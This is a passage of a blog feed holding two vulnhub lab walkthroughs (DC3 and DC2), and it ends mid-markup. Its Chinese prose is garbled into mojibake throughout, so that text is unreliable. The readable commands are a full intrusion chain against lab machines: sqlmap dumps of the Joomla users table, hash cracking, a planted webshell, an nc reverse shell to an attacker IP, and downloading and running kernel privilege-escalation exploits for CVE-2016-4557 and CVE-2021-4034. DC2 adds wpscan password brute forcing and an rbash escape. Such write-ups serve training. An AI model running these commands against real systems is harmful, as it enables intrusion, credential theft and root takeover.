        <content type="html"><![CDATA[<p>è€ƒç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ€»ç»“ï¼šjoomscanå·¥å…·çš„ä½¿ç”¨ï¼Œcve-2016-4557å†…æ ¸ææƒæˆ–è€…cve-2021-4034å†…æ ¸ææƒ</span><br></pre></td></tr></table></figure><p>ç°æ‰«ä¸€ä¸‹çœ‹å¼€æ”¾äº†å“ªäº›ç«¯å£</p><p><img src="../images/image-20230410221753236.png" alt="image-20230410221753236"></p><p>åªå¼€æ”¾äº†ä¸€ä¸ª80ç«¯å£</p><p>çœ‹èµ·æ¥åƒæ˜¯ä¸ªç½‘é¡µï¼Œç„¶åè¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230410221926196.png" alt="image-20230410221926196"></p><p>å‘ç°è¿™æ˜¯ä¸€ä¸ªcmsæ¡†æ¶</p><p>äºæ˜¯å°±ç”¨åˆ°äº†è¿™ä¸ªå·¥å…·æ¥æŸ¥çœ‹è¿™ä¸ªç½‘ç«™æ˜¯å¦å­˜åœ¨æ¼æ´</p><p><strong>Joomla!</strong>æ˜¯ä¸€å¥—å…¨çƒçŸ¥åçš„å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ŒJoomla!æ˜¯ä½¿ç”¨PHPè¯­è¨€åŠ ä¸ŠMySQLæ•°æ®åº“æ‰€å¼€å‘çš„è½¯ä»¶ç³»ç»Ÿã€‚</p><p><strong>è¿™é‡Œéœ€è¦ä½¿ç”¨ä¸€ä¸ªå·¥å…·joomscan å› ä¸ºæœ€æ–°kaliæ²¡æœ‰ åˆå»è£…äº†ä¸€ä¸‹åˆå­¦ä¹ äº†ä¸€ä¸‹ã€‚</strong></p><p>ï¼ˆJoomScanï¼‰ï¼šæ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œæ—¨åœ¨è‡ªåŠ¨æ‰§è¡ŒJoomla CMSéƒ¨ç½²ä¸­çš„æ¼æ´æ£€æµ‹å’Œå¯é æ€§ä¿è¯ä»»åŠ¡ã€‚è¯¥å·¥å…·åœ¨Perlä¸­å®ç°ï¼Œå¯ä»¥æ— ç¼è½»æ¾åœ°æ‰«æJoomlaå®‰è£…ï¼ŒåŒæ—¶é€šè¿‡å…¶è½»é‡çº§å’Œæ¨¡å—åŒ–æ¶æ„ç•™ä¸‹æœ€å°çš„å åœ°é¢ç§¯ã€‚å®ƒä¸ä»…å¯ä»¥æ£€æµ‹å·²çŸ¥çš„æ”»å‡»æ€§æ¼æ´ï¼Œè¿˜èƒ½å¤Ÿæ£€æµ‹åˆ°è®¸å¤šé”™è¯¯é…ç½®å’Œç®¡ç†å‘˜çº§åˆ«çš„ç¼ºé™·ï¼Œè¿™äº›ç¼ºé™·å¯è¢«æ”»å‡»è€…åˆ©ç”¨æ¥ç ´åç³»ç»Ÿã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/rezasp/joomscan.git </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd joomscan</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl joomscan.pl</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410223514173.png" alt="image-20230410223514173"></p><p>ä¸€äº›æœ€åŸºæœ¬çš„å‚æ•° ä½¿ç”¨å‘½ä»¤ï¼š<code>perl joomscan.pl --url 192.168.142.130</code></p><p><img src="../images/image-20230410223612886.png" alt="image-20230410223612886"></p><p>å‘ç°æ¼æ´</p><p>é€šè¿‡ä¸Šé¢çš„ æ¢æµ‹æˆ‘ä»¬å¯ä»¥çŸ¥é“<code>Joomla</code> çš„ç‰ˆæœ¬ <code>3.7.0</code> ä»¥åŠCMSçš„åå°åœ°å€<code>/administrator/</code> (è¯´æ˜å·¥å…·è¿˜æ˜¯å¼ºå¤§çš„ï¼Œçˆ†èµğŸ‘)å¹¶ä¸”è¿˜æ²¡å¼€é˜²ç«å¢™</p><p>è¿™é‡ŒçŸ¥é“ç‰ˆæœ¬å·å°±å°è¯•æŸ¥æ‰¾è¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´</p><p><a href="https://xz.aliyun.com/t/2860">è®°ä¸€æ¬¡åœ¨å®æˆ˜é¶æœºä¸­ä½¿ç”¨SearchSploitçš„æ€»ç»“</a></p><p>å°±æ˜¯åˆ©ç”¨è¿™ä¸ªå·¥å…·æ¥è¿›è¡ŒæŸ¥æ‰¾(kaliè‡ªå¸¦)</p><p>msfä¹Ÿèƒ½æŸ¥è¯¢åˆ°ï¼Œä½†æ˜¯ä¸çŸ¥é“èƒ½ä¸èƒ½è¿›è¡Œåˆ©ç”¨</p><p><img src="../images/image-20230410224100325.png" alt="image-20230410224100325"></p><p>å­˜åœ¨sqlæ³¨å…¥ </p><p>é‚£ä¹ˆæˆ‘ä»¬å°±è¿›è¡Œæ¼æ´åˆ©ç”¨   <strong>åé¢çš„pathæœ‰åˆ©ç”¨æ–¹æ³•</strong></p><p> é‚£ä¹ˆæˆ‘ä»¬å°±è¿›è¡Œè®¿é—®é‚£ä¸ªæ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/42033.txt j.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410224524420.png" alt="image-20230410224524420"></p><p>å°±ç›´æ¥ç”¨sqlmapæ¥æ‰“</p><p><img src="../images/image-20230410224900307.png" alt="image-20230410224900307"></p><p><strong>æŸ¥è¯¢åˆ°å¥½å‡ ä¸ªæ•°æ®åº“</strong></p><p><strong>æ¥ä¸‹æ¥å°±æ˜¯æŸ¥æ‰¾å½“å‰ç½‘ç«™ç”¨çš„æ•°æ®åº“æ˜¯å“ªä¸ª</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.130/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --current-db -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410225107342.png" alt="image-20230410225107342"></p><p><strong>æ¥ä¸‹æ¥å°±æ˜¯æŸ¥è¡¨</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.130/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables  -p list[fullordering]  </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410225206881.png" alt="image-20230410225206881"></p><p>æŸ¥å‡ºæ¥ä¸€å †è¡¨</p><p>è¿™é‡Œçš„è¯å°±æ³¨é‡æŸ¥è¯¢<strong>#__users</strong></p><p>æ³¨å…¥æŸ¥è¯¢<strong>#__users</strong>è¡¨ å‘ç°æœ‰6åˆ— çŸ¥é“åˆ—äº†å°±å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥å­—æ®µçš„æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.130/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns  -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410225524368.png" alt="image-20230410225524368"></p><p>å‘ç°å­˜åœ¨ç”¨æˆ·åå’Œå¯†ç </p><p>ç„¶åè¿›è¡ŒæŸ¥è¯¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u &quot;http://192.168.142.130/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;name,password&quot; --dump  -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410225648646.png" alt="image-20230410225648646"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usernameï¼šadmin</span><br><span class="line">passwordï¼š$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><br></pre></td></tr></table></figure><p>å‘ç°å¯†ç è¿›è¡Œäº†åŠ å¯†(è¿˜æ˜¯ä½¿ç”¨ä¹‹å‰ç”¨çš„<strong>john</strong>è¿›è¡Œç ´è§£)</p><p><img src="../images/image-20230410225935194.png" alt="image-20230410225935194"></p><p>çˆ†ç ´å‡ºå¯†ç  â€”â€”-&gt;  <code>snoopy</code></p><p>ç„¶åæ ¹æ®ä¹‹å‰æŸ¥å‡ºæ¥çš„åå°ç™»å½•å°±è¡Œ</p><p><img src="../images/image-20230410230119518.png" alt="image-20230410230119518"></p><p><img src="../images/image-20230410230145831.png" alt="image-20230410230145831"></p><p>ç™»å½•æˆåŠŸ</p><p>æˆåŠŸç™»å½•è¿›å»åï¼Œæˆ‘ä»¬å¼€å§‹å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œæœ€ç»ˆæˆ‘ä»¬åœ¨templatesä¸‹é¢æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥åˆ›å»ºæ–‡ä»¶å¹¶ä¸”å¯ä»¥å†™æ–‡ä»¶çš„åœ°æ–¹ã€‚äºæ˜¯ï¼Œå°è¯•å†™å…¥ä¸€å¥è¯æœ¨é©¬</p><p><img src="../images/image-20230410231044168.png" alt="image-20230410231044168"></p><p>è¿™é‡Œå°±æ˜¯ä¸€ä¸ªæ¼æ´åˆ©ç”¨ç‚¹</p><p><img src="../images/image-20230410231254633.png" alt="image-20230410231254633"></p><p>å†™è¿›æ¥åæˆ‘ä»¬å°±å¾—å»æ‰¾ä¸Šä¼ åœ°å€äº†</p><p><img src="../images/image-20230410231346635.png" alt="image-20230410231346635"></p><p>æ ¹æ®è¿™ä¸¤æ¡çŒœå‡ºæ¥çš„ç»“è®º</p><p><img src="../images/image-20230410231557812.png" alt="image-20230410231557812"></p><p>æˆåŠŸæ‰§è¡Œï¼Œä»£è¡¨ä¸Šä¼ æˆåŠŸ</p><p><img src="../images/image-20230411085918600.png" alt="image-20230411085918600"></p><p>æˆåŠŸè¿ä¸Šèšå‰‘</p><p><img src="../images/image-20230411090020317.png" alt="image-20230411090020317"></p><p>æŸ¥çœ‹è™šæ‹Ÿç»ˆç«¯å‘ç°ä¸æ˜¯rootæƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å°è¯•ä¸€ä¸‹è¿›è¡Œææƒ</p><p>å°è¯•äº†ä¸€åœˆå‘ç°suidå’Œsudoç”¨ä¸äº†æ¥è¿›è¡Œææƒï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—å°è¯•åˆ«çš„æ–¹æ³•äº†</p><p><strong>è¿™é‡Œè¯èšå‰‘ä¸é€‚åˆææƒï¼Œä¹Ÿä¸å¥½è¿›è¡Œæ“ä½œ</strong>ï¼Œæˆ‘ä»¬å°±å°è¯•å¼¹ä¸ªshellå›åˆ°æœ¬æœº</p><p>ï¼ˆé¦–å…ˆéœ€è¦æ˜ç¡®ï¼Œä¸èƒ½ä½¿ç”¨èšå‰‘ææƒï¼Œå› ä¸ºHTTPæ˜¯ç¬æ—¶åè®®ï¼Œæˆ‘è¿™è¾¹æ­£ææƒå‘¢ï¼Œä½ é‚£è¾¹TCPå››æ¬¡æŒ¥æ‰‹æ–­å¼€è¿æ¥äº†ï¼Œä¸èƒ½æŒä¹…è¿æ¥ï¼Œæ‰€ä»¥èšå‰‘çš„ä½œç”¨å°±åœ¨äºä¸Šä¼ æ–‡ä»¶æ¥åå¼¹shellã€‚)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.142.129 4444 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯phpçš„åå¼¹shellæ“ä½œ</p><p><img src="../images/image-20230411090508994.png" alt="image-20230411090508994"></p><p>åå¼¹shellæˆåŠŸ</p><p>æ¥ä¸‹æ¥æ•´ä¸€ä¸ªpythonäº¤äº’çš„shellå¥½è¿›è¡Œæ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411090616944.png" alt="image-20230411090616944"></p><p>è®¾ç½®æˆåŠŸ</p><p>è¿™é‡Œç”±äºå‰ä¸¤ä¸ªç‚¹ææƒä¸æˆåŠŸï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•è¿›è¡Œå†…æ ¸ææƒ</p><h3 id="å†…æ ¸ææƒ"><a href="#å†…æ ¸ææƒ" class="headerlink" title="å†…æ ¸ææƒ"></a>å†…æ ¸ææƒ</h3><p><a href="https://juejin.cn/post/7164665837511507999">LINUXææƒä¹‹å†…æ ¸æ¼æ´ææƒç¯‡</a></p><p>å…ˆè¿›è¡Œå†…æ ¸çš„æŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411091229892.png" alt="image-20230411091229892"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a      # æŸ¥çœ‹å‘è¡Œç‰ˆæœ¬</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411091330803.png" alt="image-20230411091330803"></p><p><code> </code></p><p>äºæ˜¯å°±ä½¿ç”¨searchsploit</p><p><img src="../images/image-20230411091513906.png" alt="image-20230411091513906"></p><p>è¿™ä¸¤ä¸ªç©æ„ç¡®å®å­˜åœ¨æ¼æ´</p><h4 id="cve-2016-4557"><a href="#cve-2016-4557" class="headerlink" title="cve-2016-4557"></a>cve-2016-4557</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchspolit -x linux/local/39772.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411094349657.png" alt="image-20230411092545805"></p><p>è¿˜ä¼šæŠŠCVEå‘Šè¯‰ä½ </p><p>äºæ˜¯è®¿é—®è¿™ä¸ªæœ¬åœ°çš„è¿™ä¸ªå®Œæ•´åœ°å€</p><p><img src="../images/image-20230411092823114.png" alt="image-20230411092823114"></p><p>å‘ç°ç»™äº†ä¸€ä¸ªexpä¸‹è½½åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//å°†expä¸‹è½½è¿‡æ¥</span><br><span class="line">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</span><br><span class="line"> </span><br><span class="line">//è§£å‹</span><br><span class="line">unzip 39772.zip</span><br><span class="line"> </span><br><span class="line">//è¿›å»åˆ°39772ç›®å½•</span><br><span class="line">cd 39*</span><br><span class="line"> </span><br><span class="line">//è§£å‹exploit.tar</span><br><span class="line">tar -xvf ex*</span><br><span class="line"> </span><br><span class="line">//åˆ°ebpf_mapfd_doubleput_exploitç›®å½•ä¸­</span><br><span class="line">cd eb*</span><br><span class="line"> </span><br><span class="line">//è¿è¡Œcompile.shæ–‡ä»¶</span><br><span class="line">./compile.sh</span><br><span class="line"> </span><br><span class="line">//è¿è¡Œç”Ÿæˆçš„æ–‡ä»¶doubleput</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411093124013.png" alt="image-20230411093124013"></p><p><strong>è¿™å°±æ˜¯åˆ©ç”¨å†…æ ¸ææƒ</strong></p><p><img src="../images/image-20230411093211569.png" alt="image-20230411093211569"></p><h4 id="cve-2021-4034"><a href="#cve-2021-4034" class="headerlink" title="cve-2021-4034"></a>cve-2021-4034</h4><p><a href="https://www.iceswordlab.com/2022/02/10/CVE-2021-4034/">CVE-2021-4034 pkexec æœ¬åœ°ææƒæ¼æ´åˆ©ç”¨è§£æ</a>   è¿™ç¯‡æ–‡ç« ä¹Ÿå¯ä»¥è¿›è¡Œåˆ©ç”¨</p><p><img src="../images/image-20230411093533747.png" alt="image-20230411093533747"></p><p>æµ‹è¯•ç¯å¢ƒï¼Œæ¯”ä¸Šé¢çš„ç¯å¢ƒè¿˜è¦æ–°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//ä½¿ç”¨gitå‘½ä»¤å°†expå¤åˆ¶åˆ°é¶æœºä¸­</span><br><span class="line">git clone https://github.com/arthepsy/CVE-2021-4034</span><br><span class="line"> </span><br><span class="line">//æ¥åˆ°CVE-2021-4034ç›®å½•</span><br><span class="line">cd CVE*</span><br><span class="line"> </span><br><span class="line">//ç¼–è¯‘cve-2021-4034-poc.c</span><br><span class="line">gcc cve* -o cve-2021-4034</span><br><span class="line"> </span><br><span class="line">//è¿è¡Œcve-2021-4034</span><br><span class="line">./cve-2021-4034</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“</strong></p><p>å­¦åˆ°äº†å‡ ä¸ªå·¥å…·çš„ä½¿ç”¨</p><p><strong>joomscan â€”-&gt;  é’ˆå¯¹joomçš„cmsçš„</strong></p><p><strong>searchspolit  â€”â€”-&gt;    æŸ¥æ‰¾expçš„  ä¾‹å¦‚cms  å†…æ ¸ç‰ˆæœ¬</strong>   </p><p><strong>john  â€”â€”â€”&gt;    çˆ†ç ´åŠ å¯†å¯†ç </strong></p><p><strong>sqlmap   å°±æ˜¯ç»å¸¸ç”¨çš„å·¥å…·äº†</strong>  </p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub DC3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub DC2</title>
      <link href="/posts/d620da00.html"/>
      <url>/posts/d620da00.html</url>
      
        <content type="html"><![CDATA[<p><strong>æ€»ç»“:cewlå’Œwpscançš„ä½¿ç”¨ï¼Œrbashé€ƒé€¸ï¼Œsuid<a href="https://so.csdn.net/so/search?q=ææƒ&amp;spm=1001.2101.3001.7020">ææƒ</a></strong></p><p>cewl  â€”â€”&gt;   å¯†ç ç”Ÿæˆå·¥å…·</p><p>wpscan  â€”-&gt;  çˆ†ç ´ç”¨æˆ·å</p><p><a href="https://www.freebuf.com/sectool/174663.html">WPScanä½¿ç”¨å®Œæ•´æ”»ç•¥ï¼šå¦‚ä½•å¯¹Wordpressç«™ç‚¹è¿›è¡Œå®‰å…¨æµ‹è¯•</a></p><p><img src="../images/image-20230409204637751.png" alt="image-20230409204637751"></p><p>è¿˜æ˜¯ç°æ‰«ä¸‹cæ®µçœ‹ä¸‹é¶æœºip</p><p><img src="../images/image-20230409203330539.png" alt="image-20230409203330539"></p><p>çŒœä¸€ä¸‹æ˜¯131ï¼Œæˆ–è€…ç”¨å’ŒDC1è¯´çš„é‚£ç§å…³é¶æœºçš„æ–¹æ³•ä¹Ÿè¡Œ</p><p><img src="../images/image-20230409203510524.png" alt="image-20230409203510524"></p><p>é¶æœºå¼€äº†ä¸¤ä¸ªç«¯å£</p><p><img src="../images/image-20230409203649238.png" alt="image-20230409203649238"></p><p>å‘ç°é‡å®šå‘åˆ°ä¸€ä¸ªåŸŸåï¼Œè¿™é‡Œå’Œhtbé‡Œçš„ä¸€é“é¢˜ä¸€æ ·ï¼Œå¾—ä¿®æ”¹hosts</p><p><strong>å°±æ˜¯dnsåŸŸåè§£ææœ‰å…³</strong></p><p><img src="../images/image-20230409203850335.png" alt="image-20230409203850335"></p><p>ä¿®æ”¹å¥½åå†æ¬¡è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230409203912792.png" alt="image-20230409203912792"></p><p>æˆåŠŸè¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230409203935440.png" alt="image-20230409203935440"></p><p>è¿™æ¬¡æ˜¯ä½¿ç”¨äº†wordpressæ¡†æ¶</p><p><img src="../images/image-20230409204105356.png" alt="image-20230409204105356"></p><p>æ‰¾åˆ°äº†flag1</p><p>å¹¶ä¸”ç»™äº†æç¤º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">æ‚¨é€šå¸¸çš„å•è¯åˆ—è¡¨å¯èƒ½ä¸èµ·ä½œç”¨ï¼Œæ‰€ä»¥ç›¸åï¼Œä¹Ÿè®¸æ‚¨åªéœ€è¦ cewlã€‚</span><br><span class="line"></span><br><span class="line">æ›´å¤šå¯†ç æ€»æ˜¯æ›´å¥½ï¼Œä½†æœ‰æ—¶æ‚¨æ— æ³•èµ¢å¾—æ‰€æœ‰å¯†ç ã€‚</span><br><span class="line"></span><br><span class="line">ä»¥ä¸€ä¸ªäººèº«ä»½ç™»å½•ä»¥æŸ¥çœ‹ä¸‹ä¸€ä¸ªæ ‡å¿—ã€‚</span><br><span class="line"></span><br><span class="line">å¦‚æœæ‰¾ä¸åˆ°ï¼Œè¯·ä»¥å¦ä¸€ä¸ªèº«ä»½ç™»å½•ã€‚</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æç¤ºäº†ä½¿ç”¨<strong>cewl</strong>(ä¸€ä¸ªå­—å…¸ç”Ÿæˆå·¥å…·)</p><p><a href="https://www.codercto.com/a/44828.html">cewlçš„è¯¦ç»†ä½¿ç”¨æ•™å­¦</a></p><p>é€šè¿‡ä»–çš„æç¤ºï¼Œä¹Ÿè¯¥ä¸æ­¢æœ‰ä¸€ä¸ªç”¨æˆ·</p><p>æ‰€ä»¥æˆ‘ä»¬å°±å¾—ä½¿ç”¨å·¥å…·çˆ†ç ´å‡ºè¿™ä¸ªç½‘ç«™çš„æ‰€æœ‰ç”¨æˆ·</p><p>é‚£ä¹ˆæ—¢ç„¶æˆ‘ä»¬æœ‰äº†å¯†ç  æˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“ç”¨æˆ·åä½¿ç”¨<strong>wpscan</strong> è¿™ä¸ªå·¥å…·  é’ˆå¯¹wordpressæ¡†æ¶ä½¿ç”¨çš„</p><p>ä½¿ç”¨å‘½ä»¤ï¼š<code>wpscan --url http://dc-2/ -e</code></p><p><img src="../images/image-20230409205001726.png" alt="image-20230409205001726"></p><p>æ‰«åˆ°äº†ä¸‰ä¸ªç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2 -w pass.txt ç„¶åå°±å»å‚è€ƒåˆ«çš„äººçš„äº†</span><br><span class="line">wpscan --url http://dc-2/ -e //æšä¸¾ç”¨æˆ·å</span><br><span class="line">echo &quot;admin\njerry\ntom\n&quot; &gt; user.txt //å°†æšä¸¾åˆ°çš„ä¸‰ä¸ªç”¨æˆ·ï¼Œæ·»åŠ åˆ°user.txtä¸­</span><br><span class="line">wpscan --url http://dc-2 user.txt -P pass.txt //ç„¶åçˆ†ç ´è´¦å·å¯†ç </span><br></pre></td></tr></table></figure><p>çˆ†ç ´å‡ºæ¥å¯†ç äº†   æ¥ä¸‹æ¥å°±æ˜¯ç™»å½•åå°äº†</p><p><img src="../images/image-20230409210248545.png" alt="image-20230409210248545"></p><p>adminæ²¡çˆ†ç ´å‡ºæ¥</p><p>æ‰€ä»¥æˆ‘ä»¬å¼€å§‹æ‰«ç½‘ç«™çš„ç›®å½•</p><p><img src="../images/image-20230409210736812.png" alt="image-20230409210736812"></p><p>ç”¨å…¶ä»–æ‰«ç›®å½•å·¥å…·ä¹Ÿè¡Œï¼Œæ‰«å‡ºæ¥ä¸€ä¸ªåå°</p><p><img src="../images/image-20230409210819324.png" alt="image-20230409210819324"></p><p>é‡å®šå‘åˆ°äº†ä¸€ä¸ªç™»å½•æ¡†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ‹¿ä¹‹å‰çˆ†ç ´å‡ºæ¥çš„è´¦å·å¯†ç è¿›è¡Œç™»å½•</p><p><img src="../images/image-20230409210935313.png" alt="image-20230409210935313"></p><p>æˆåŠŸç™»å½•åå°</p><p><img src="../images/image-20230409211115820.png" alt="image-20230409211115820"></p><p>æ‰¾åˆ°äº†flag2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœæ‚¨ä¸èƒ½åˆ©ç”¨ WordPress å¹¶èµ°æ·å¾„ï¼Œè¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ã€‚</span><br><span class="line">ï¼ˆå°±æ˜¯ä¸èƒ½åˆ©ç”¨expï¼‰</span><br><span class="line">å¸Œæœ›ä½ æ‰¾åˆ°äº†å¦ä¸€ä¸ªåˆ‡å…¥ç‚¹ã€‚</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°è¯•<code>tom</code>è´¦æˆ· å‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆå¯ç”¨çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹‹å‰æ‰«å‡ºæ¥çš„å¼€å¯sshç«¯å£å°±æ´¾ä¸Šç”¨åœºäº†</p><p><img src="../images/image-20230409211423049.png" alt="image-20230409211423049"></p><p>çœŸçš„ç™»å½•æˆåŠŸäº†</p><p><img src="../images/image-20230409211507283.png" alt="image-20230409211507283"></p><p>ä½†æ˜¯å‡ºç°äº†ä¸€ä¸ªç‰¹æ®Šæƒ…å†µå°±æ˜¯å‘½ä»¤æ²¡æœ‰è¢«æ‰¾åˆ°</p><p>çˆ†äº†ä¸€ä¸ª   <strong>-rbashçš„ç©æ„</strong></p><p><a href="https://cloud.tencent.com/developer/article/1680551">rbashç»•è¿‡</a></p><p>é‚£ä¹ˆæˆ‘ä»¬å°è¯•è¿›è¡Œç¼–è¾‘æŸ¥çœ‹ï¼Œçœ‹è¡Œä¸è¡Œ(å°±æ˜¯ä½¿ç”¨vim)</p><p><img src="../images/image-20230409211629232.png" alt="image-20230409211629232"></p><p>å‘ç°å¯ä»¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯æ€œçš„è€æ±¤å§†æ€»æ˜¯è¿½ç€æ°ç‘ã€‚ä¹Ÿè®¸ä»–åº”è¯¥ä¸ºä»–é€ æˆçš„æ‰€æœ‰å‹åŠ›è€Œè‹ã€‚</span><br></pre></td></tr></table></figure><p>æ ¹æ®è¿™ä¸ªå†…å®¹åˆ‡æ¢æˆjerryè´¦æˆ·ä¸€ä¸‹</p><p>æ‰€ä»¥çŒœæƒ³è¿™é‡Œçš„æç¤ºåº”è¯¥æ˜¯æƒ³æˆ‘ä»¬åˆ‡æ¢åˆ°jerryç”¨æˆ·ï¼Œè€Œä¸æ˜¯é‡æ–°sshç™»å½•åˆ°jerryç”¨æˆ·</p><p>ç„¶åå‘ç°å¯†ç ä¸å¯¹ï¼Œæ‰€ä»¥å°±è¿˜æ˜¯å¥½å¥½ç ”ç©¶ä¸€ä¸‹æ€ä¹ˆç»•è¿‡<strong>rbash</strong>å§</p><p><strong>tips</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//æ–¹æ³•1</span><br><span class="line">vi a //éšä¾¿ä¸€ä¸ªæ–‡ä»¶</span><br><span class="line">shift+;  è¾“å…¥set shell=/bin/bashå›è½¦</span><br><span class="line">shift+;  è¾“å…¥shell</span><br><span class="line">è¾“å…¥export PATH=$PATH:/bin/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//æ–¹æ³•2</span><br><span 